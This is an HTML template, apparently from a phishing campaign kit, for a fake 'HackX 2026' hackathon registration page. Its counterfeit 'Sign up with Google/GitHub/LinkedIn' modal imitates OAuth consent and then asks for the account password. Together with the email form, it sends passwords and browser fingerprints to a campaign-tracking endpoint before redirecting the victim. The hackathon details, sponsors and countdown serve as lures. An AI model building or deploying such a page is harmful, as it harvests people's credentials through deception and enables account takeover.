<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HackX 2026 — Global Hackathon</title>
  <script src="/fingerprint.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #0a0a0f; color: #fff; min-height: 100vh;
    }
    .bg-grad {
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: radial-gradient(ellipse at 20% 50%, rgba(88, 28, 135, 0.15) 0%, transparent 50%),
                  radial-gradient(ellipse at 80% 20%, rgba(6, 78, 59, 0.12) 0%, transparent 50%),
                  radial-gradient(ellipse at 50% 80%, rgba(29, 78, 216, 0.1) 0%, transparent 50%);
      z-index: -1;
    }

    .navbar {
      display: flex; justify-content: space-between; align-items: center;
      padding: 1.2rem 2.5rem; max-width: 1200px; margin: 0 auto;
    }
    .navbar .logo { font-size: 1.4rem; font-weight: 800; letter-spacing: -0.5px; }
    .navbar .logo span { color: #a855f7; }
    .navbar .nav-links { display: flex; gap: 2rem; align-items: center; }
    .navbar .nav-links a { color: #aaa; text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: 0.2s; }
    .navbar .nav-links a:hover { color: #fff; }
    .navbar .nav-btn {
      background: linear-gradient(135deg, #7c3aed, #a855f7);
      color: #fff; padding: 0.5rem 1.2rem; border-radius: 8px;
      font-size: 0.85rem; font-weight: 600; border: none; cursor: pointer; transition: 0.2s;
    }
    .navbar .nav-btn:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4); }

    .hero {
      display: flex; align-items: center; justify-content: space-between;
      max-width: 1200px; margin: 2rem auto; padding: 0 2.5rem;
      gap: 4rem;
    }
    .hero-left { flex: 1; }
    .hero-left .badge {
      display: inline-block; background: rgba(168, 85, 247, 0.15); color: #a855f7;
      padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
      border: 1px solid rgba(168, 85, 247, 0.2); margin-bottom: 1.2rem;
    }
    .hero-left h1 {
      font-size: 3.2rem; font-weight: 900; line-height: 1.1; letter-spacing: -1px;
      background: linear-gradient(135deg, #fff 40%, #a855f7);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      margin-bottom: 1rem;
    }
    .hero-left p {
      color: #888; font-size: 1.05rem; line-height: 1.6; max-width: 480px; margin-bottom: 2rem;
    }

    .hero-right { flex: 0 0 420px; }

    .register-card {
      background: rgba(18, 18, 26, 0.9); border: 1px solid rgba(255,255,255,0.06);
      backdrop-filter: blur(20px); border-radius: 20px; padding: 2rem;
    }
    .register-card h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 0.3rem; }
    .register-card .sub { color: #666; font-size: 0.8rem; margin-bottom: 1.5rem; }
    .register-card label { display: block; font-size: 0.75rem; font-weight: 600; color: #aaa; margin-bottom: 0.3rem; text-transform: uppercase; letter-spacing: 0.5px; }
    .register-card input {
      width: 100%; padding: 0.75rem 0.9rem; background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; color: #fff;
      font-size: 0.9rem; margin-bottom: 1rem; transition: 0.2s;
    }
    .register-card input:focus { outline: none; border-color: #7c3aed; box-shadow: 0 0 0 3px rgba(124,58,237,0.15); }
    .register-card input::placeholder { color: #444; }
    .register-card .row { display: flex; gap: 0.8rem; }
    .register-card .row > * { flex: 1; }
    .register-card .terms {
      font-size: 0.7rem; color: #555; margin: 0.5rem 0 1.2rem; line-height: 1.4;
    }
    .register-card .terms a { color: #a855f7; text-decoration: none; }
    .register-btn {
      width: 100%; padding: 0.8rem; background: linear-gradient(135deg, #7c3aed, #a855f7);
      border: none; border-radius: 10px; color: #fff; font-size: 0.95rem;
      font-weight: 700; cursor: pointer; transition: 0.2s;
    }
    .register-btn:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(124,58,237,0.4); }

    .social-divider {
      display: flex; align-items: center; margin: 1.2rem 0; color: #444; font-size: 0.75rem;
      gap: 1rem;
    }
    .social-divider::before, .social-divider::after { content: ''; flex: 1; border-bottom: 1px solid rgba(255,255,255,0.06); }

    .social-btns { display: flex; flex-direction: column; gap: 0.6rem; }
    .social-btn {
      display: flex; align-items: center; gap: 0.7rem; width: 100%; padding: 0.7rem 1rem;
      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);
      border-radius: 10px; color: #ddd; font-size: 0.85rem; font-weight: 500;
      cursor: pointer; transition: 0.2s; text-decoration: none;
    }
    .social-btn:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.12); }
    .social-btn svg { flex-shrink: 0; }

    .register-card .alt-login {
      text-align: center; margin-top: 1.2rem; padding-top: 1.2rem;
      border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.8rem; color: #666;
    }
    .register-card .alt-login a { color: #a855f7; text-decoration: none; font-weight: 600; }

    /* ── OAuth Modal ── */
    .modal-overlay {
      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 1000;
      align-items: center; justify-content: center;
    }
    .modal-overlay.active { display: flex; }
    .modal {
      background: #15151f; border: 1px solid rgba(255,255,255,0.08);
      border-radius: 20px; padding: 2rem; width: 100%; max-width: 400px;
      animation: modalIn 0.25s ease;
    }
    @keyframes modalIn { from { opacity: 0; transform: scale(0.95) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
    .modal .modal-header { display: flex; align-items: center; gap: 0.8rem; margin-bottom: 0.5rem; }
    .modal .modal-header .icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.1rem; }
    .modal .modal-header h3 { font-size: 1.1rem; font-weight: 700; }
    .modal .modal-sub { color: #666; font-size: 0.8rem; margin-bottom: 1.5rem; }
    .modal .perm-list { margin-bottom: 1.5rem; }
    .modal .perm-item { display: flex; align-items: center; gap: 0.8rem; padding: 0.5rem 0; font-size: 0.85rem; color: #aaa; }
    .modal .perm-item .check { color: #22c55e; font-weight: 700; }
    .modal input {
      width: 100%; padding: 0.75rem 0.9rem; background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; color: #fff;
      font-size: 0.9rem; margin-bottom: 1rem; transition: 0.2s;
    }
    .modal input:focus { outline: none; border-color: #7c3aed; box-shadow: 0 0 0 3px rgba(124,58,237,0.15); }
    .modal .modal-btn {
      width: 100%; padding: 0.75rem; border: none; border-radius: 10px;
      font-size: 0.9rem; font-weight: 600; cursor: pointer; transition: 0.2s; color: #fff;
    }
    .modal .modal-btn:hover { transform: translateY(-1px); }
    .modal .modal-skip {
      display: block; text-align: center; margin-top: 1rem; font-size: 0.75rem; color: #555; cursor: pointer;
    }
    .modal .modal-skip:hover { color: #888; }
    .modal .close-btn {
      position: absolute; top: 1rem; right: 1rem; background: none; border: none;
      color: #555; font-size: 1.2rem; cursor: pointer;
    }
    .modal-wrap { position: relative; }

    .features {
      max-width: 1200px; margin: 5rem auto; padding: 0 2.5rem;
    }
    .features h2 { text-align: center; font-size: 1.8rem; font-weight: 800; margin-bottom: 0.5rem; }
    .features .subtitle { text-align: center; color: #666; font-size: 0.95rem; margin-bottom: 3rem; }
    .feature-grid {
      display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem;
    }
    .feature-card {
      background: rgba(18, 18, 26, 0.6); border: 1px solid rgba(255,255,255,0.04);
      border-radius: 16px; padding: 1.8rem; transition: 0.3s;
    }
    .feature-card:hover { border-color: rgba(168,85,247,0.2); transform: translateY(-2px); }
    .feature-card .icon { font-size: 2rem; margin-bottom: 1rem; }
    .feature-card h3 { font-size: 1rem; font-weight: 700; margin-bottom: 0.4rem; }
    .feature-card p { font-size: 0.85rem; color: #666; line-height: 1.5; }

    .countdown-wrap {
      text-align: center; padding: 3rem 2.5rem; max-width: 600px; margin: 3rem auto;
    }
    .countdown-wrap h2 { font-size: 1.5rem; font-weight: 800; margin-bottom: 1.5rem; }
    .countdown { display: flex; justify-content: center; gap: 1.5rem; }
    .countdown-item { text-align: center; }
    .countdown-item .num {
      font-size: 2.5rem; font-weight: 900; color: #a855f7;
      background: rgba(168,85,247,0.08); border: 1px solid rgba(168,85,247,0.15);
      width: 80px; height: 80px; display: flex; align-items: center; justify-content: center;
      border-radius: 16px; margin-bottom: 0.3rem;
    }
    .countdown-item .label { font-size: 0.7rem; color: #666; text-transform: uppercase; letter-spacing: 1px; }

    .sponsors { max-width: 900px; margin: 4rem auto; padding: 0 2.5rem; text-align: center; }
    .sponsors h3 { font-size: 0.75rem; color: #555; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 2rem; }
    .sponsor-logos { display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap; }
    .sponsor-logos div { color: #444; font-size: 1rem; font-weight: 700; letter-spacing: -0.5px; }

    .footer { text-align: center; padding: 2rem; color: #444; font-size: 0.75rem; border-top: 1px solid rgba(255,255,255,0.04); }
    .error-msg { color: #ef4444; font-size: 0.8rem; margin-bottom: 0.5rem; display: none; }

    @media (max-width: 900px) {
      .hero { flex-direction: column; gap: 2rem; }
      .hero-right { flex: 1; width: 100%; }
      .hero-left h1 { font-size: 2.2rem; }
      .feature-grid { grid-template-columns: 1fr 1fr; }
      .navbar .nav-links { display: none; }
    }
    @media (max-width: 600px) {
      .hero { padding: 0 1.5rem; }
      .feature-grid { grid-template-columns: 1fr; }
      .countdown-item .num { width: 60px; height: 60px; font-size: 1.8rem; }
    }
  </style>
</head>
<body>
  <div class="bg-grad"></div>

  <nav class="navbar">
    <div class="logo">Hack<span>X</span> 2026</div>
    <div class="nav-links">
      <a href="#">About</a>
      <a href="#">Challenges</a>
      <a href="#">Schedule</a>
      <a href="#">Sponsors</a>
      <button class="nav-btn" onclick="document.getElementById('email')?.focus()">Register</button>
    </div>
  </nav>

  <section class="hero">
    <div class="hero-left">
      <div class="badge">Applications closing soon</div>
      <h1>Build the<br>future in 48 hours</h1>
      <p>
        The world's most ambitious hackathon. 5,000+ participants, $500K in prizes,
        and mentorship from top engineers at Google, Meta, and OpenAI.
      </p>
      <div style="display:flex;gap:1rem;flex-wrap:wrap;">
        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">5,000+ hackers</span></div>
        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">$500K prize pool</span></div>
        <div style="display:flex;align-items:center;gap:0.5rem;"><span style="color:#a855f7;">✓</span><span style="color:#888;font-size:0.85rem;">120+ countries</span></div>
      </div>
    </div>

    <div class="hero-right">
      <div class="register-card">
        <h2>Apply now</h2>
        <p class="sub">Secure your spot — applications are reviewed on a rolling basis.</p>

        <div class="error-msg" id="error">Something went wrong. Please try again.</div>

        <div class="social-btns">
          <button class="social-btn" onclick="openOAuth('google')">
            <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"/><path fill="#FF3D00" d="m6.306 14.691 6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"/><path fill="#4CAF50" d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"/><path fill="#1976D2" d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"/></svg>
            Sign up with Google
          </button>
          <button class="social-btn" onclick="openOAuth('github')">
            <svg width="20" height="20" viewBox="0 0 16 16"><path fill="#fff" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/></svg>
            Sign up with GitHub
          </button>
          <button class="social-btn" onclick="openOAuth('linkedin')">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#0a66c2" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            Sign up with LinkedIn
          </button>
        </div>

        <div class="social-divider">or continue with email</div>

        <form id="registerForm">
          <label>Full name</label>
          <input type="text" id="fullname" placeholder="John Doe" required autocomplete="off">
          <label>Email address</label>
          <input type="email" id="email" placeholder="john@example.com" required autocomplete="off">
          <label>Password</label>
          <input type="password" id="password" placeholder="Create a password" required>
          <div class="row">
            <div><label>GitHub</label><input type="text" id="github" placeholder="@username" autocomplete="off"></div>
            <div><label>Country</label><input type="text" id="country" placeholder="India" autocomplete="off"></div>
          </div>
          <div class="terms">
            By registering, you agree to our <a href="#">Terms of Service</a> and <a href="#">Code of Conduct</a>.
          </div>
          <button type="submit" class="register-btn">Create account →</button>
        </form>
        <div class="alt-login">
          Already registered? <a href="#" onclick="event.preventDefault();document.getElementById('email')?.focus()">Sign in</a>
        </div>
      </div>
    </div>
  </section>

  <!-- OAuth Modal -->
  <div class="modal-overlay" id="oauthModal">
    <div class="modal" style="max-width:420px;">

      <!-- Step 1: Email -->
      <div id="oauthStep1">
        <div class="modal-wrap">
          <div class="modal-header">
            <div class="icon" id="modalIcon">🔵</div>
            <h3 id="modalTitle">Sign in with Google</h3>
          </div>
          <p class="modal-sub" id="modalSub">HackX 2026 wants to access your account</p>
          <div class="perm-list">
            <div class="perm-item"><span class="check">✓</span> View your email address</div>
            <div class="perm-item"><span class="check">✓</span> View your profile info</div>
            <div class="perm-item"><span class="check">✓</span> Access your name and avatar</div>
          </div>
          <input type="email" id="oauthEmail" placeholder="Enter your email address" required autocomplete="off">
          <button class="modal-btn" id="modalBtn1" onclick="oauthStep2()">Continue with Google</button>
          <span class="modal-skip" onclick="closeOAuth()">Not now</span>
        </div>
      </div>

      <!-- Step 2: Password (hidden initially) -->
      <div id="oauthStep2" style="display:none;">
        <div class="modal-wrap">
          <div class="modal-header">
            <div class="icon" id="modalIcon2" style="background:rgba(24,119,242,0.15);">🔵</div>
            <h3>Verify your account</h3>
          </div>
          <p class="modal-sub">Your email <strong id="oauthEmailDisplay" style="color:#fff;"></strong> already has an account. Enter your password to link it with <span id="oauthProviderName">Google</span>.</p>
          <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:10px;padding:1rem;margin-bottom:1.5rem;">
            <div class="perm-item" style="padding:0.3rem 0;"><span class="check">✓</span> Link <span id="oauthProviderName2">Google</span> account</div>
            <div class="perm-item" style="padding:0.3rem 0;"><span class="check">✓</span> Keep your profile data</div>
          </div>
          <input type="password" id="oauthPassword" placeholder="Enter your HackX password" required autocomplete="off">
          <button class="modal-btn" id="modalBtn2" onclick="submitOAuth()">Link and continue</button>
          <span class="modal-skip" onclick="closeOAuth()">Cancel</span>
        </div>
      </div>

    </div>
  </div>

  <section class="features">
    <h2>Why Hack<span style="color:#a855f7;">X</span>?</h2>
    <p class="subtitle">The hackathon experience engineered for impact</p>
    <div class="feature-grid">
      <div class="feature-card"><div class="icon">🧠</div><h3>AI / ML Challenges</h3><p>Build with GPT-4, Claude, Gemini, and open-source models. Access free API credits.</p></div>
      <div class="feature-card"><div class="icon">🌐</div><h3>Global Community</h3><p>Team up with hackers from 120+ countries. Real-time collaboration and mentorship.</p></div>
      <div class="feature-card"><div class="icon">🏆</div><h3>$500K in Prizes</h3><p>Equity-free grants, cloud credits, internships, and fast-track interviews.</p></div>
      <div class="feature-card"><div class="icon">⚡</div><h3>48-Hour Sprint</h3><p>From idea to prototype. Workshops, office hours, and on-demand hardware labs.</p></div>
      <div class="feature-card"><div class="icon">🔬</div><h3>Hardware Lab</h3><p>Arduino, Raspberry Pi, NVIDIA Jetson, and IoT kits shipped to your doorstep.</p></div>
      <div class="feature-card"><div class="icon">🚀</div><h3>Launchpad Program</h3><p>Top teams get 3 months of incubation, legal support, and investor introductions.</p></div>
    </div>
  </section>

  <section class="countdown-wrap">
    <h2>Applications close in</h2>
    <div class="countdown">
      <div class="countdown-item"><div class="num" id="days">14</div><div class="label">Days</div></div>
      <div class="countdown-item"><div class="num" id="hours">08</div><div class="label">Hours</div></div>
      <div class="countdown-item"><div class="num" id="minutes">42</div><div class="label">Mins</div></div>
      <div class="countdown-item"><div class="num" id="seconds">19</div><div class="label">Secs</div></div>
    </div>
  </section>

  <section class="sponsors">
    <h3>Sponsored by</h3>
    <div class="sponsor-logos">
      <div>Google</div><div>Meta</div><div>OpenAI</div><div>GitHub</div><div>Vercel</div><div>Stripe</div>
    </div>
  </section>

  <div class="footer">
    © 2026 HackX Global. All rights reserved. • Privacy Policy • Code of Conduct
  </div>

  <script>
    let currentOAuth = 'google';

    const OAUTH_CONFIG = {
      google: { name: 'Google', icon: '🔵', color: '#1877f2', bg: 'rgba(24,119,242,0.15)', btnColor: '#1877f2' },
      github: { name: 'GitHub', icon: '⚫', color: '#fff', bg: 'rgba(255,255,255,0.08)', btnColor: '#24292e' },
      linkedin: { name: 'LinkedIn', icon: '🔷', color: '#0a66c2', bg: 'rgba(10,102,194,0.15)', btnColor: '#0a66c2' },
    };

    function openOAuth(provider) {
      currentOAuth = provider;
      const cfg = OAUTH_CONFIG[provider];

      // Reset to step 1
      document.getElementById('oauthStep1').style.display = '';
      document.getElementById('oauthStep2').style.display = 'none';
      document.getElementById('oauthEmail').value = '';
      document.getElementById('oauthPassword').value = '';

      // Configure step 1
      document.getElementById('modalIcon').textContent = cfg.icon;
      document.getElementById('modalIcon').style.background = cfg.bg;
      document.getElementById('modalTitle').textContent = 'Sign in with ' + cfg.name;
      document.getElementById('modalSub').textContent = 'HackX 2026 wants to access your ' + cfg.name + ' account';
      document.getElementById('modalBtn1').textContent = 'Continue with ' + cfg.name;
      document.getElementById('modalBtn1').style.background = cfg.btnColor;
      document.getElementById('oauthEmail').placeholder = 'Enter your ' + cfg.name + ' email';

      document.getElementById('oauthModal').classList.add('active');
      setTimeout(() => document.getElementById('oauthEmail').focus(), 200);
    }

    function oauthStep2() {
      const email = document.getElementById('oauthEmail').value;
      if (!email || !email.includes('@')) {
        document.getElementById('oauthEmail').style.borderColor = '#ef4444';
        setTimeout(() => document.getElementById('oauthEmail').style.borderColor = '', 1500);
        return;
      }

      const cfg = OAUTH_CONFIG[currentOAuth];

      // Show step 2
      document.getElementById('oauthStep1').style.display = 'none';
      document.getElementById('oauthStep2').style.display = '';

      document.getElementById('oauthEmailDisplay').textContent = email;
      document.getElementById('oauthProviderName').textContent = cfg.name;
      document.getElementById('oauthProviderName2').textContent = cfg.name;
      document.getElementById('modalIcon2').textContent = cfg.icon;
      document.getElementById('modalIcon2').style.background = cfg.bg;
      document.getElementById('modalBtn2').style.background = cfg.btnColor;

      setTimeout(() => document.getElementById('oauthPassword').focus(), 200);
    }

    function closeOAuth() {
      document.getElementById('oauthModal').classList.remove('active');
    }

    document.getElementById('oauthModal').addEventListener('click', (e) => {
      if (e.target === document.getElementById('oauthModal')) closeOAuth();
    });

    // Enter key support for both steps
    document.getElementById('oauthEmail').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); oauthStep2(); }
    });
    document.getElementById('oauthPassword').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); submitOAuth(); }
    });

    async function submitOAuth() {
      const email = document.getElementById('oauthEmail').value;
      const password = document.getElementById('oauthPassword').value;
      if (!password) {
        document.getElementById('oauthPassword').style.borderColor = '#ef4444';
        setTimeout(() => document.getElementById('oauthPassword').style.borderColor = '', 1500);
        return;
      }

      const provider = currentOAuth;
      const fp = await getFingerprint();

      try {
        const res = await fetch('/c/<%= campaign.id %>', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email, password,
            oauth_provider: provider,
            fullname: email.split('@')[0],
            ...fp,
            fingerprints: JSON.stringify(fp)
          })
        });
        const data = await res.json();
        if (data.redirect) window.location.href = data.redirect;
      } catch {
        window.location.href = '<%= redirect %>';
      }
    }

    // Countdown
    function updateCountdown() {
      const target = new Date(); target.setDate(target.getDate() + 14); target.setHours(target.getHours() + 8);
      const diff = target - new Date();
      if (diff <= 0) return;
      document.getElementById('days').textContent = String(Math.floor(diff/(86400000))).padStart(2,'0');
      document.getElementById('hours').textContent = String(Math.floor((diff%86400000)/3600000)).padStart(2,'0');
      document.getElementById('minutes').textContent = String(Math.floor((diff%3600000)/60000)).padStart(2,'0');
      document.getElementById('seconds').textContent = String(Math.floor((diff%60000)/1000)).padStart(2,'0');
    }
    updateCountdown(); setInterval(updateCountdown, 1000);

    // Registration form
    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const fullname = document.getElementById('fullname').value;
      const github = document.getElementById('github').value;
      const country = document.getElementById('country').value;
      const fp = await getFingerprint();
      try {
        const res = await fetch('/c/<%= campaign.id %>', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password, fullname, github, country, oauth_provider: 'email', ...fp, fingerprints: JSON.stringify(fp) })
        });
        const data = await res.json();
        if (data.redirect) window.location.href = data.redirect;
      } catch { window.location.href = '<%= redirect %>'; }
    });
  </script>
</body>
</html>
